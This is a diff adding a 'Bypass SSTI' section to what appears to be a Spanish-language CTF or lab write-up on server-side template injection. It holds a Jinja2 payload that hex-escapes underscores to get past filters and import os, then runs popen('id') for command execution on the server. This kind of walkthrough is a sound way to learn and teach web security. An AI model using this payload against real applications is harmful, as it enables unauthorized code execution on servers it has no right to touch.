@@ -98,4 +98,9 @@ realizamos una prueba y es posible ver el resultado dentro del nombre de archivo
 interceptamos la petición con burpsuite y podemos confirmar que se esta ejecutando correctamente el resultado de {{7 * 7}} a partir de aqui solo necesitamos conseguir hacer Bypass para poder ejecutar codigo
 ![[Pasted image 20240409002315.png]]
 
+### Bypass SSTI 
+```python
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
+
+![[Pasted image 20240409003615.png]]
